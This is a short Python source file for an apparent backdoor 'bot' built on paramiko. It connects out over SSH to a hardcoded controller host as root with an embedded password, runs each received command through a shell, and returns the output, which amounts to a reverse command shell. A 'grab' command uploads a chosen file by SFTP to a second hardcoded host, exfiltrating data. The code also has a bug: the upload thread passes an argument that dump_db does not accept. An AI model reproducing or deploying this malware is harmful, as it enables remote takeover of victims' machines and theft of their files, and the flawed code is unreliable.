from paramiko import Transport
from paramiko import SFTPClient
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from threading import  Thread
from  subprocess import Popen
from  subprocess import PIPE
import ChannelSSH

class Bot():
    def __init__(self):
        self.path = None


    def getOutputCmd(self,cmd):
        # do shell command
        try:
            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            return stdout_value
        except:
            pass

    def dump_db(self):
        try:
            transport = Transport(('192.168.43.96', 222))
            transport.connect(username='dumper', password='dontgiveafuck')
            sftp_client = SFTPClient.from_transport(transport)
            sftp_client.put(self.path, '/home/roughiz/tmp/test/' +self.path)
            sftp_client.close()
            transport.close()
        except:
            pass


    def connect(self):
        subRoot = None
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect('192.168.43.99',port=2222, username='root', password='thetoorpassword')
        chan = client.get_transport().open_session()
        while True:
            command = ChannelSSH.receiveFromChannel(chan)
            if 'deconnect' in command:
                ChannelSSH.closeChannel(chan)
                break
            elif 'grab' in command:
                try:
                    blah, path = command.split('*')
                except:
                    ChannelSSH.sendToChannel('[-]command syntax error',chan)
                Thread(target=self.dump_db, args=(path,)).start()
                ChannelSSH.sendToChannel('[+]Starting SFTP Function',chan)
            else:
                ChannelSSH.sendToChannel(self.getOutputCmd(command),chan)


if __name__ == '__main__':
    bot = Bot()
    bot.connect()